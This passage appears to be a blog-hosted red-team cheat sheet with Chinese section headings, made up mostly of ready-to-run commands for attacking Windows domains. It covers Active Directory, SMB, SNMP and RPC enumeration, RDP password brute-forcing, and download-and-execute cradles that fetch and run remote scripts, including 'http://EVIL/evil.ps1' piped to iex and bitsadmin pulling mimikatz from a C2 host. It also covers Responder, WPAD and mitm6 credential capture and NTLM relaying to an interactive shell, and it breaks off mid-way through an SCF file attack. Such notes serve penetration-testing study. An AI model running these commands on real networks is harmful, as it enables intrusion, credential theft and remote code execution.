class="line">#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts</span><br><span class="line"></span><br><span class="line">LDAPUtility.cs</span><br><span class="line"></span><br><span class="line">Usage: ldaputility.exe options domain [arguments]</span><br><span class="line"></span><br><span class="line">ldaputility.exe DumpAllUsers m0chan</span><br><span class="line">ldaputility.exe DumpUser m0chan mr.un1k0d3r</span><br><span class="line">ldaputility.exe DumpUsersEmail m0chan</span><br><span class="line">ldaputility.exe DumpAllComputers m0chan </span><br><span class="line">ldaputility.exe DumpComputer m0chan DC01</span><br><span class="line">ldaputility.exe DumpAllGroups m0chan</span><br><span class="line">ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;</span><br><span class="line">ldaputility.exe DumpPasswordPolicy m0chan</span><br><span class="line"></span><br><span class="line">Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.</span><br><span class="line"></span><br><span class="line">See github linked above for full details.</span><br></pre></td></tr></table></figure><h3 id="1-1-4-活动目录"><a href="#1-1-4-活动目录" class="headerlink" title="1.1.4 活动目录"></a>1.1.4 活动目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:DomainName</span><br><span class="line">nltest /DCNAME:DomainName</span><br><span class="line">nltest /DSGETDC:DomainName</span><br><span class="line"></span><br><span class="line"># Get Current Domain Info - Similar to Get-Domain</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"></span><br><span class="line"># Get Domain Trust Info - Similar to Get-DomainTrust</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View Domain Info</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"></span><br><span class="line">#  View Domain Trust Information</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&apos;Forest&apos;, &apos;forest-of-interest.local&apos;)))).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line">nltest [server:&lt;fqdn_foreign_domain&gt;] /domain_trusts /all_trusts /v</span><br><span class="line"></span><br><span class="line">nltest /dsgetfti:&lt;domain&gt;</span><br><span class="line"></span><br><span class="line">nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts</span><br><span class="line"></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View All Domain Controllers</span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line"># View DC for Current Session</span><br><span class="line">nltest /dsgetdc:m0chanAD.local</span><br><span class="line"></span><br><span class="line"># View Domain Trusts from CMD</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"># View User Info from CMD</span><br><span class="line">nltest /user:&quot;m0chan&quot;</span><br><span class="line"></span><br><span class="line"># get domain name and DC the user authenticated to</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># Get All Logged on Sessions, Includes NTLM &amp; Kerberos</span><br><span class="line">klist sessions</span><br><span class="line"></span><br><span class="line"># View Kerb Tickets</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># View Cached Krbtgt</span><br><span class="line">klist tgt</span><br><span class="line"></span><br><span class="line"># whoami on older Windows systems</span><br><span class="line">set u</span><br><span class="line"></span><br><span class="line">#List all Usernames</span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List Administrators</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List all Info about Specific User</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties</span><br><span class="line"></span><br><span class="line">#View All Users with Description Field Set</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125;</span><br></pre></td></tr></table></figure><h3 id="1-1-5-从Linux-Box进行AD枚举-AD工具"><a href="#1-1-5-从Linux-Box进行AD枚举-AD工具" class="headerlink" title="1.1.5 从Linux Box进行AD枚举-AD工具"></a>1.1.5 从Linux Box进行AD枚举-AD工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jasonwbarnett/linux-adtool</span><br><span class="line"></span><br><span class="line">tar zxvf adtools-1.x.tar.gz</span><br><span class="line">cd adtools-1.x</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">&gt; adtool list ou=user,dc=example,dc=com</span><br><span class="line">CN=allusers,OU=user,DC=example,DC=com</span><br><span class="line">OU=finance,OU=user,DC=example,DC=com</span><br><span class="line">OU=administration,OU=user,DC=example,DC=com</span><br><span class="line"></span><br><span class="line">&gt; adtool oucreate marketing ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool setpass jsmith banana</span><br><span class="line">&gt; adtool unlock jsmith</span><br><span class="line">&gt; adtool groupadd allusers jsmith</span><br><span class="line">&gt; adtool attributereplace jsmith telephonenumber 123</span><br><span class="line">&gt; adtool attributereplace jsmith mail jsmith@example.com</span><br></pre></td></tr></table></figure><h3 id="1-1-6-SharpView枚举"><a href="#1-1-6-SharpView枚举" class="headerlink" title="1.1.6 SharpView枚举"></a>1.1.6 SharpView枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/tevora-threat/SharpView</span><br><span class="line"></span><br><span class="line">Get-DomainFileServer</span><br><span class="line">Get-DomainGPOUserLocalGroupMapping</span><br><span class="line">Find-GPOLocation</span><br><span class="line">Get-DomainGPOComputerLocalGroupMapping</span><br><span class="line">Find-GPOComputerAdmin</span><br><span class="line">Get-DomainObjectAcl</span><br><span class="line">Get-ObjectAcl</span><br><span class="line">Add-DomainObjectAcl</span><br><span class="line">Add-ObjectAcl</span><br><span class="line">Remove-DomainObjectAcl</span><br><span class="line">Get-RegLoggedOn</span><br><span class="line">Get-LoggedOnLocal</span><br><span class="line">Get-NetRDPSession</span><br><span class="line">Test-AdminAccess</span><br><span class="line">Invoke-CheckLocalAdminAccess</span><br><span class="line">Get-WMIProcess</span><br><span class="line">Get-NetProcess</span><br><span class="line">Get-WMIRegProxy</span><br><span class="line">Get-Proxy</span><br><span class="line">Get-WMIRegLastLoggedOn</span><br><span class="line">Get-LastLoggedOn</span><br><span class="line">Get-WMIRegCachedRDPConnection</span><br><span class="line">Get-CachedRDPConnection</span><br><span class="line">Get-WMIRegMountedDrive</span><br><span class="line">Get-RegistryMountedDrive</span><br><span class="line">Find-InterestingDomainAcl</span><br><span class="line">Invoke-ACLScanner</span><br><span class="line">Get-NetShare</span><br><span class="line">Get-NetLoggedon</span><br></pre></td></tr></table></figure><h3 id="1-1-7-SMB枚举"><a href="#1-1-7-SMB枚举" class="headerlink" title="1.1.7 SMB枚举"></a>1.1.7 SMB枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls</span><br><span class="line">enum4linux 1.3.3.7</span><br><span class="line">smbmap -H 1.3.3.7</span><br><span class="line">smbclient -L \\INSERTIPADDRESS</span><br><span class="line">smbclient -L INSERTIPADDRESS</span><br><span class="line">smbclient //INSERTIPADDRESS/tmp</span><br><span class="line">smbclient \\\\INSERTIPADDRESS\\ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/admin$ -U john</span><br><span class="line">nbtscan [SUBNET]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Check for SMB Signing</span><br><span class="line">nmap --script smb-security-mode.nse -p 445 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-8-SNMP枚举"><a href="#1-1-8-SNMP枚举" class="headerlink" title="1.1.8 SNMP枚举"></a>1.1.8 SNMP枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -c public -v1 10.10.14.14</span><br><span class="line">snmpcheck -t 10.10.14.14 -c public</span><br><span class="line">onesixtyone -c names -i hosts</span><br><span class="line">nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt</span><br><span class="line">snmpenum -t 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-9-MySQL枚举"><a href="#1-1-9-MySQL枚举" class="headerlink" title="1.1.9 MySQL枚举"></a>1.1.9 MySQL枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122</span><br></pre></td></tr></table></figure><h3 id="1-1-10-DNS区域转移"><a href="#1-1-10-DNS区域转移" class="headerlink" title="1.1.10 DNS区域转移"></a>1.1.10 DNS区域转移</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig axfr blah.com @ns1.m0chan.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d m0chan.com</span><br><span class="line">dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span><br></pre></td></tr></table></figure><h3 id="1-1-11-LDAP"><a href="#1-1-11-LDAP" class="headerlink" title="1.1.11 LDAP"></a>1.1.11 LDAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://&lt;ip&gt;</span><br><span class="line">ldapwhoami</span><br></pre></td></tr></table></figure><h3 id="1-1-12-RPC枚举"><a href="#1-1-12-RPC枚举" class="headerlink" title="1.1.12 RPC枚举"></a>1.1.12 RPC枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;10.10.14.14&quot;</span><br><span class="line">srvinfo</span><br><span class="line">enumdomusers</span><br><span class="line">enumalsgroups domain</span><br><span class="line">lookupnames administrators</span><br><span class="line">querydominfo</span><br><span class="line">enumdomusers</span><br><span class="line">queryuser &lt;user&gt;</span><br><span class="line">lsaquery</span><br><span class="line">lookupnames Guest</span><br><span class="line">lookupnames Administrator</span><br></pre></td></tr></table></figure><h3 id="1-1-13-远程桌面"><a href="#1-1-13-远程桌面" class="headerlink" title="1.1.13 远程桌面"></a>1.1.13 远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u guest -p guest INSERTIPADDRESS -g 94%</span><br><span class="line"></span><br><span class="line"># Brute force</span><br><span class="line">ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS</span><br></pre></td></tr></table></figure><h1 id="0x02-文件传输"><a href="#0x02-文件传输" class="headerlink" title="0x02 文件传输"></a>0x02 文件传输</h1><h2 id="2-1-TFTP"><a href="#2-1-TFTP" class="headerlink" title="2.1 TFTP"></a>2.1 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m0chan Machine</span><br><span class="line">mkdir tftp</span><br><span class="line">atftpd --deamon --port 69 tftp</span><br><span class="line">cp *file* tftp</span><br><span class="line">On victim machine:</span><br><span class="line">tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt;</span><br></pre></td></tr></table></figure><h2 id="2-2-FTP"><a href="#2-2-FTP" class="headerlink" title="2.2 FTP"></a>2.2 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open &lt;[IP]&gt; 21 &gt; ftp.txt</span><br><span class="line">echo USER demo &gt;&gt; ftp.txt</span><br><span class="line">echo ftp &gt;&gt; ftp.txt</span><br><span class="line">echo bin &gt;&gt; ftp.txt</span><br><span class="line">echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line">ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure><h2 id="2-3-VBS-Script"><a href="#2-3-VBS-Script" class="headerlink" title="2.3 VBS Script"></a>2.3 VBS Script</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cscript wget.vbs &lt;url&gt; &lt;out_file&gt;</span><br><span class="line"></span><br><span class="line">Use echoup function on pentest.ws to generate echo commands.</span><br><span class="line">https://pentest.ws/features</span><br></pre></td></tr></table></figure><h2 id="2-4-Powershell"><a href="#2-4-Powershell" class="headerlink" title="2.4 Powershell"></a>2.4 Powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles</span><br><span class="line"></span><br><span class="line">Invoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;</span><br><span class="line"></span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) </span><br><span class="line"></span><br><span class="line">#Powershell Download to Memory</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).downloadString(&apos;http://server/script.ps1&apos;)</span><br><span class="line"></span><br><span class="line">#Powershell with Proxy</span><br><span class="line"></span><br><span class="line">$browser = New-Object System.Net.WebClient;</span><br><span class="line">$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;</span><br><span class="line">IEX($browser.DownloadString(&apos;https://server/script.ps1&apos;));</span><br></pre></td></tr></table></figure><h2 id="2-5-Powershell-Base64"><a href="#2-5-Powershell-Base64" class="headerlink" title="2.5 Powershell Base64"></a>2.5 Powershell Base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fileName = &quot;Passwords.kdbx&quot;</span><br><span class="line">$fileContent = get-content $fileName</span><br><span class="line">$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)</span><br><span class="line">$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)</span><br><span class="line">$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)</span><br></pre></td></tr></table></figure><h2 id="2-6-安全复制-pscp-exe"><a href="#2-6-安全复制-pscp-exe" class="headerlink" title="2.6 安全复制/ pscp.exe"></a>2.6 安全复制/ pscp.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt</span><br><span class="line">pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt</span><br></pre></td></tr></table></figure><h2 id="2-7-BitsAdmin-exe"><a href="#2-7-BitsAdmin-exe" class="headerlink" title="2.7 BitsAdmin.exe"></a>2.7 BitsAdmin.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="2-8-Remote-Desktop"><a href="#2-8-Remote-Desktop" class="headerlink" title="2.8 Remote Desktop"></a>2.8 Remote Desktop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.10.10.10 -r disk:linux=&apos;/home/user/filetransferout&apos;</span><br></pre></td></tr></table></figure><h2 id="2-9-WinHTTP-Com-Object"><a href="#2-9-WinHTTP-Com-Object" class="headerlink" title="2.9 WinHTTP Com Object"></a>2.9 WinHTTP Com Object</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[System.Net.WebRequest]::DefaultWebProxy</span><br><span class="line">[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&apos;GET&apos;,&apos;http://EVIL/evil.ps1&apos;,$false);$h.send();iex $h.responseText</span><br></pre></td></tr></table></figure><h2 id="2-10-CertUtil"><a href="#2-10-CertUtil" class="headerlink" title="2.10 CertUtil"></a>2.10 CertUtil</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#File Transfer</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename</span><br><span class="line"></span><br><span class="line">#CertUtil Base64 Transfers</span><br><span class="line"></span><br><span class="line">certutil.exe -encode inputFileName encodedOutputFileName</span><br><span class="line">certutil.exe -decode encodedInputFileName decodedOutputFileName</span><br></pre></td></tr></table></figure><h2 id="2-11-Curl-Windows-1803"><a href="#2-11-Curl-Windows-1803" class="headerlink" title="2.11 Curl (Windows 1803+)"></a>2.11 Curl (Windows 1803+)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://server/file -o file</span><br><span class="line">curl http://server/file.bat | cmd</span><br><span class="line"></span><br><span class="line">IEX(curl http://server/script.ps1);Invoke-Blah</span><br></pre></td></tr></table></figure><h2 id="2-12-SMB"><a href="#2-12-SMB" class="headerlink" title="2.12 SMB"></a>2.12 SMB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support</span><br></pre></td></tr></table></figure><h1 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h1><h2 id="3-1-LLMNR-NBT-NS欺骗"><a href="#3-1-LLMNR-NBT-NS欺骗" class="headerlink" title="3.1 LLMNR / NBT-NS欺骗"></a>3.1 LLMNR / NBT-NS欺骗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Responder to Steal Creds</span><br><span class="line"></span><br><span class="line">git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like</span><br><span class="line"></span><br><span class="line">&apos;Yeah I&apos;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&apos;</span><br></pre></td></tr></table></figure><h2 id="3-2-Responder-WPAD-Attack"><a href="#3-2-Responder-WPAD-Attack" class="headerlink" title="3.2 Responder WPAD Attack"></a>3.2 Responder WPAD Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 wpad</span><br><span class="line"></span><br><span class="line">By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet</span><br><span class="line"></span><br><span class="line">Go to internet explorer and search for Google which automatically searches for a WPAD file... </span><br><span class="line"></span><br><span class="line">Then take NTLMv2 hash and NTLM Relay it or send to cracking rig.</span><br></pre></td></tr></table></figure><h2 id="3-3-mitm6"><a href="#3-3-mitm6" class="headerlink" title="3.3 mitm6"></a>3.3 mitm6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. </span><br><span class="line"></span><br><span class="line">By default IPV6 should be enabled. </span><br><span class="line">git clone https://github.com/fox-it/mitm6.git </span><br><span class="line">cd /opt/tools/mitm6</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line">mitm6 -d m0chanAD.local</span><br><span class="line"></span><br><span class="line">Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. </span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i</span><br><span class="line"></span><br><span class="line">-i opens an interactive shell.</span><br><span class="line"></span><br><span class="line">Shout out to hausec for this super nice tip.</span><br></pre></td></tr></table></figure><h2 id="3-4-SCF文件攻击"><a href="#3-4-SCF文件攻击" class="headerlink" title="3.4 SCF文件攻击"></a>3.4 SCF文件攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Create .scf file and drop inside SMB Share and fire up Responder ;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Filename = 